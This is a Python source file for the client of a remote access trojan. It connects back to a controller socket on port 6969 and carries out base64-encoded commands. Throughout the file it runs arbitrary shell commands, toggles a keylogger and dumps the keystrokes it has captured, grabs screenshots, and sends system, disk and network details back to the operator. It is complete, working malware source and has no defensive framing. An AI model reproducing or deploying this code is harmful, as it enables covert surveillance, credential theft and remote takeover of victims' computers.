import base64
import io
import os
import platform
import shlex
import signal
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime

import ifaddr
import psutil
import pyscreenshot
import requests
import tabulate
from pynput.keyboard import Key, Listener

CONSTIP = "0.0.0.0"
CONSTPT = 6969


class PERSISTENCE:

    def __init__(self):
        pass


class SYSINFO:

    DATA_STRING = ""

    def __init__(self):
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info = self.get_net_info()

    def get_size(self, bolter, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bolter < factor:
                return f"{bolter:.2f}{unit}{suffix}"

            bolter /= factor

    def get_sys_info(self):
        headers = ("Platform Tag", "Information")
        values = []

        uname = platform.uname()

        values.append(("System", uname.system))
        values.append(("Node Name", uname.node))
        values.append(("Release", uname.release))
        values.append(("Version", uname.version))
        values.append(("Machine", uname.machine))
        values.append(("Processor", uname.processor))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_boot_time(self):
        headers = ("Boot Tags", "Information")
        values = []

        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)

        values.append(
            ("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_cpu_info(self):
        headers = ("CPU Tag", "Value")
        values = []

        cpufreq = psutil.cpu_freq()

        values.append(("Physical Cores", psutil.cpu_count(logical=False)))
        values.append(("Total Cores", psutil.cpu_count(logical=True)))
        values.append(("Max Frequency", f"{cpufreq.max:.2f}Mhz"))
        values.append(("Min Frequency", f"{cpufreq.min:.2f}Mhz"))
        values.append(("Current Frequency", f"{cpufreq.current:.2f}Mhz"))
        values.append(("CPU Usage", f"{psutil.cpu_percent()}%"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_mem_usage(self):
        headers = ("Memory Tag", "Value")
        values = []

        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()

        values.append(("Total Mem", f"{self.get_size(svmem.total)}"))
        values.append(("Available Mem", f"{self.get_size(svmem.available)}"))
        values.append(("Used Mem", f"{self.get_size(svmem.used)}"))
        values.append(("Percentage", f"{self.get_size(svmem.percent)}%"))

        values.append(("Total Swap", f"{self.get_size(swap.total)}"))
        values.append(("Free Swap", f"{self.get_size(swap.free)}"))
        values.append(("Used Swap", f"{self.get_size(swap.used)}"))
        values.append(("Percentage Swap", f"{self.get_size(swap.percent)}%"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_disk_info(self):
        headers = ("Device", "Mountpoint", "File System",
                   "Total Size", "Used", "Free", "Percentage")
        values = []

        partitions = psutil.disk_partitions()

        toappend = []
        for partition in partitions:
            toappend.append(partition.device)
            toappend.append(partition.mountpoint)
            toappend.append(partition.fstype)

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                toappend.append(self.get_size(partition_usage.total))
                toappend.append(self.get_size(partition_usage.used))
                toappend.append(self.get_size(partition_usage.free))
                toappend.append(self.get_size(partition_usage.percent))
            except PermissionError:
                toappend.append(" ")
                toappend.append(" ")
                toappend.append(" ")
                toappend.append(" ")

            values.append(toappend)
            toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_net_info(self):
        headers = ('Interface', 'IP Address', 'MAC Address',
                   'Netmask', 'Broadcast IP', 'Broadcast MAC')
        values = []

        if_addrs = psutil.net_if_addrs()
        toappend = []

        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                toappend.append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    toappend.append(address.address)
                    toappend.append('')
                    toappend.append(address.netmask)
                    toappend.append(address.broadcast)
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    toappend.append('')
                    toappend.append(address.address)
                    toappend.append(address.netmask)
                    toappend.append('')
                    toappend.append(address.broadcast)

                values.append(toappend)
                toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_data(self):
        self.DATA_STRING = "\n" + self.sysinfo + "\n\n" + self.boot_time + "\n\n" + self.cpu_info + "\n\n" + \
            self.mem_usage + "\n\n" + self.disk_info + "\n\n" + self.net_info + "\n\n"
        return self.DATA_STRING


class SCREENSHOT:

    SC_DATA = b""

    def __init__(self):
        self.generate()

    def generate(self):
        obj = io.BytesIO()
        im = pyscreenshot.grab()
        im.save(obj, format="PNG")
        self.SC_DATA = obj.getvalue()

    def get_data(self):
        return self.SC_DATA


class CLIENT:

    SOCK = None
    KEY = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port = _pt

    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(
                tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(
                tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        def on_press(key):
            if not self.KEYLOGGER_STATUS:
                return False

            key = str(key)
            if len(key.strip('\'')) == 1:
                self.KEYLOGGER_STROKES += key.strip('\'')
            else:
                self.KEYLOGGER_STROKES += ("[" + key + "]")

        def on_release(key):
            if not self.KEYLOGGER_STATUS:
                return False

        def logger():
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

        if status:
            if not self.KEYLOGGER_STATUS:
                self.KEYLOGGER_STATUS = True
                t = threading.Thread(target=logger)
                t.daemon = True
                t.start()
        else:
            self.KEYLOGGER_STATUS = False

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(
                        data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

        elif data[0] == "keylogger":
            if data[1] == "on":
                self.turn_keylogger(True)
                self.send_data("")
            elif data[1] == "off":
                self.turn_keylogger(False)
                self.send_data("")
            elif data[1] == "dump":
                self.send_data(self.KEYLOGGER_STROKES)

        elif data[0] == "sysinfo":
            sysinfo = SYSINFO()
            self.send_data(sysinfo.get_data())

        elif data[0] == "screenshot":
            screenshot = SCREENSHOT()
            self.send_data(screenshot.get_data(), encode=False)

        elif data[0] == "rsipconfig":
            try:
                adapters = ifaddr.get_adapters()
                msg = ""
                for adapter in adapters:
                    title = str("\n\nNetwork adapter name: '" +
                                adapter.nice_name + "':\n")
                    msg += title
                    for ip in adapter.ips:
                        desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
                        msg += desc
                msg += "\n"
                ip = requests.get('https://api.ipify.org').text
                msg += "\nPublic IP address: " + ip + "\n"
                self.send_data(msg)
            except:
                msg = "- Could not get network adapters"
                self.send_data(msg)

    def acceptor(self):
        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(
                    base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                self.SOCK.connect((self.ipaddress, self.port))
            except:
                print("Failed to Connect. Trying Again!")
                time.sleep(5)
                continue

            self.acceptor()


def main():
    client = CLIENT(CONSTIP, CONSTPT)
    client.engage()


if __name__ == "__main__":
    main()
